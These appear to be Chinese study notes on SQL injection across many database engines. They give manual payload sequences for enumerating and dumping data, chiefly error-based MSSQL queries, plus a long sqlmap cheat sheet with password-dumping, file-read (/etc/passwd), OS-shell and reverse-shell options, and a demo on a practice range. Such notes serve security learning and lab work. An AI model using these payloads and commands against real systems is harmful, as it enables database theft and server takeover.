**前言**:SQL作用在关系型数据库上面，什么是关系型数据库?关系型数据库是由一张张的二维表组成的， 常见的关系型数据库厂商有MySQL、SQLite、SQL Server、Oracle，由于MySQL是免费的，所以企业一般用MySQL的居多。Web  SQL是前端的数据库，它也是本地存储的一种，使用SQLite实现，SQLite是一种轻量级数据库，它占的空间小，支持创建表，插入、修改、删除表格数据，但是不支持修改表结构，如删掉一纵列，修改表头字段名等。但是可以把整张表删了。同一个域可以创建多个DB，每个DB有若干张表。

与数据库产生交互就有可能存在注入攻击，不只是MySQL数据库，还有Oracle，MongoDB等数据库也可能会存在注入攻击。

![](https://gitee.com/YatJay/image/raw/master/img/202202062108857.png)

除了Access数据库之外，其他数据库的SQL注入基本步骤如下所示：

![](https://gitee.com/YatJay/image/raw/master/img/202202062132539.png)

# 涉及知识

## 各种数据库的注入特点

### 数据库架构组成

除了Access之外，其他数据库组成架构基本相似，且Access目前在市面上很少。

#### Access

##### Access数据库架构

- 表名
  - 列名
    - 数据

##### Access特点

- Access数据库保存在网站源码下面，数据库文件名后缀为`.mdb`
- 各个网站数据库只在自己网站目录下，和其他网站的数据库不关联，所以无法进行跨库操作
- Access没有文件读写等操作

#### MySQL msSQL等

##### 数据库架构

- 数据库名A
  - 表名
    - 列名
      - 数据

- 数据库名B
  - 表名
    - 列名
      - 数据

##### 特点

- MySQL msSQL等，所有网站的数据库由数据库软件统一管理
- 所有网站的数据库统一管理，且和其他网站的数据库相关联(information_schema库)，可以跨库操作
- 可以文件读写操作

### 数据库高权限操作

问：什么决定网站注入点用户权限？

答：连接数据库的文件即数据库配置文件决定注入点用户权限。比如sqlilabs程序连接数据库部分源码如下：说明sqlilabs连接MySQL数据库时使用的是root用户账号和密码。

```php
<?php
//give your mysql connection username n password
$dbuser ='root';
$dbpass ='root';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";
?>
```



## 各种数据库注入原理

Access、MySQL、msSQL、Oracle、PostSQL、SQLite、MongoDB注入思路

### Access注入

由于Access数据库架构问题，Access数据库不存在`database()`函数查数据库名，也没有`information_schema`数据库，因此就没有MySQL数据库的查数据库名、表名、列名等流程，只需直接来到查询指定数据这一步，查询过程中`select 字段1,字段2 from 表名`中的字段名、表名首先尝试暴力猜解即硬猜或用字典跑。

==遗留问题：==

如果遇到列名猜解不到的情况，则可以使用Access偏移注入(下一节内容)

### SQL server/MSSQL注入

#### 介绍

Microsoft SQL Server 是一个全面的数据库平台，使用集成的商业智能 (BI)工具提供了企业级的数据管理。Microsoft  SQL Server 数据库引擎为关系型数据和结构化数据提供了更安全可靠的存储功能，使您可以构建和管理用于业务的高可用和高性能的数据应用程序。

#### 注入过程

##### **①**判断数据库类型

and exists (select * from sysobjects)--返回正常为mssql(也名sql server)

and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈

##### **②**判断数据库版本

and 1=@@version--这个语句要在有回显的模式下才可以哦

and substring((select  @@version),22,4)='2008'--适用于无回显模式，后面的2008就是数据库版本，     返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是        2008的话就返回正常）

##### **③**获取所有数据库的个数 (以下3条语句可供选择使用)

1. and 1=(select quotename(count(name)) from master..sysdatabases)--

2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --

3. and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --

  and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --

  and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid>5) --

说明：dbid从1-4的数据库一般为系统数据库.

##### **④**获取数据库 （该语句是一次性获取全部数据库的，且语句只适合>=2005，两条语句可供选择使用）

​    and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--

​    and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--

##### ⑤获取当前数据库

and db_name()>0

and 1=(select db_name())--

##### **⑥**获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于  mssql2005及以上版本）】

​    and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))-- 

​     and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U'  FOR XML PATH(''))--

##### **⑦**获得表里的列

一次爆指定表的所有列（只限于mssql2005及以上版本）：

​     and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))-- 

​     and 1=(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))--

##### ⑧获取指定数据库中的表的列的数据库

逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：

​    and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(''))--

一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：

​     and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--复制代码第一条语句：and  1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(''))--测试效果图：----------------------------------加上where条件筛选结果出来会更加好，如：where  and name like '%user%' 就会筛选出含有user关键词的出来。用在筛选表段时很不错。

转自：http://www.myhack58.com/Article/html/3/8/2015/63146.htm

### PostgreSQL注入

https://www.webshell.cc/524.html

https://www.cnblogs.com/yilishazi/p/14710349.html

https://www.jianshu.com/p/ba0297da2c2e

### Oracle注入

https://www.cnblogs.com/peterpan0707007/p/8242119.html

### MongoDB注入

![](https://gitee.com/YatJay/image/raw/master/img/202202081232860.png)

https://blog.csdn.net/weixin_33881753/article/details/87981552

https://www.secpulse.com/archives/3278.html

## 各数据库手工注入流程

### MySQL：

1. 找到注入点 `and 1=1 and 1=2` 测试报错

2. `order by 5 #` 到5的时候报错，获取字段总数为4

3. id=0(不是1就行，强行报错) `union select 1,2,3,4 #` 联合查询，2和3可以显示信息

4. 获取数据库信息

​		`user()` ==>root

​		`database()` ==>mozhe_Discuz_StormGroup

​		`version()` ==>5.7.22-0ubuntu0.16.04.1

5. 获取数据库表

​		`table_name` 表名

​		`information_schema.tables` 系统生成信息表

​		`table_schema=数据库名`16进制或者用单引号括起来

​		改变`limit 0,1`中前一个参数，得到两个表 StormGroup_member notice

6. 获取列名

​		结果如下 id,name,password,status

7. 脱库

### Access：

1. `and 1=2` 报错找到注入点

2. `order by` 获取总字段

3. 猜解表名 

   `and exists(select * from admin)` 页面返回正常，说明存在admin表

4. 猜解列名 

   `and exists(select id from admin)` 页面显示正常，admin表中存在id列 username,passwd 同样存在

5. 脱库 union select 1,username,passwd,4 from admin

### MSSQL：

1.`and 1=2` 报错

2.`order by N#` 获取总字段

3.猜表名 `and exists(select * from manage)` 表名manage存在

4.猜解列名 `and exists(select id from manage)` 列名id存在，同样username,password也存在

5.脱裤 `and exists(select id from manage where id=1)` 证明id=1存在

`and exists(select id from manage where%20 len(username)=8 and id=1)` 猜解username字段长度为8

`and exists(select id from manage where%20 len(password)=16 and id=1)` 猜解password字段长度为16

可用Burp的Intruder功能辅助猜解

猜解username第1到8位的字符，ASCII转码 admin_mz

猜解password第1到16位的字符，ASCII转码(Burp 爆破)

转ASCII的py脚本：

72e1bfc3f01b7583 MD5解密为97285101

### SQLite：

1.找注入点 `and 1=1`

2.`order by N` 猜字段 4

3.猜数据库

offset ==>0~2

有三个数据库：

WSTMart_reg

notice_sybase

sqlite_sequence

4.猜列

共有3个字段：

id,name,password

5.脱裤

 

### MongoDB:

1.id=1′ 单引号注入报错

2.闭合语句，查看所有集合

3.查看指定集合的数据

[0] 代表第一条数据，可递增

 

### DB2:

1.and 1=2 判断注入点

2.order by N 获取字段数

3.爆当前数据库

GAME_CHARACTER

4.列表

NAME

5.脱裤

 

### PostgreSQL:

1.`and 1=2` 判断注入点

2.`order by N` 获取字段

3.爆数据库

4.列表

5.列字段

6.拖库

 

### Sybase数据库：

1.`and 1=2` 判断注入点

2.`order by N` 获取总字段

3.爆数据库

4.列表

5.列字段

6.查状态

结果为：zhang

7.反选爆用户名

结果为：mozhe

8.猜解密码

 

### Oracle：

1.`and 1=1`

2.`order by`

3.爆数据库

4.列表

5.列字段

6.拖库

加上状态：1 where STATUS=1

## 各种和注入工具使用指南sqlmap、NoSQLAttack、pangolin

### 工具的支持库、注入模式、优缺点



### sqlmap基本操作

参考：

[Sqlmap使用教程1](..\Part0 补充内容\03_工具使用\sqlmap使用教程1.md)

[Sqlmap使用教程2](..\Part0 补充内容\03_工具使用\sqlmap使用教程2.md)

```bash
//基本操作笔记：
-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段(列名) 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
```


```bash
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 
```
常用语句 :
```bash
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"
```

简单的注入流程 :
```bash
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
```

### NoSQLAttack

#### 介绍

项目地址：https://github.com/youngyangyang04/NoSQLAttack

NoSQLAttack 是一个用python编写的开源的攻击工具，用来暴露网络中默认配置mongoDB的IP并且下载目标mongoDB的数据，同时还可以针对以mongoDB为后台存储的应用进行注入攻击，使用这个工具就可以发现有成千上万的mongoDB裸奔在互联网上，并且数据可以随意下载。



## 思维导图

![思维导图](https://cdn.nlark.com/yuque/0/2021/png/22078880/1628259135798-52b5c7fc-28ca-4e2b-b81d-adff187f1f54.png)

# 演示案例

## Access注入

地址：https://www.mozhe.cn/bug/detail/VExmTm05OHhVM1dBeGdYdmhtbng5UT09bW96aGUmozhe

访问靶场

![](https://gitee.com/YatJay/image/raw/master/img/202202081106703.png)

`order by`查字段数为4

![](https://gitee.com/YatJay/image/raw/master/img/202202081107748.png)

![](https://gitee.com/YatJay/image/raw/master/img/202202081108145.png)

`union select 1,2,3,4 from 猜解表名`确定显示位置，这里我们**猜**当前数据库有一个admin表

![](https://gitee.com/YatJay/image/raw/master/img/202202081114693.png)

`union select 1,猜解字段名A,猜解字段名B,4 from 猜解表名`查询指定数据，这里我们**猜**admin表中有字段username、passwd

![](https://gitee.com/YatJay/image/raw/master/img/202202081116162.png)

可见爆出指定数据





































# 涉及资源
https://www.cnblogs.com/bmjoker/p/9326258.html  sqlmap超详细笔记+思维导图

https://github.com/youngyangyang04/NoSQLAttack   NoSQLAttack

https://github.com/sqlmapproject/sqlmap/zipball/master     SQLmap

https://blog.csdn.net/qq_39936434/category_9103379.html

https://www.mozhe.cn/bug/detail/ZUd5cld1TU9zdEJ0NWFaSTNXeERRdz09bW96aGUmozhe   Mozhe学院oracle注入
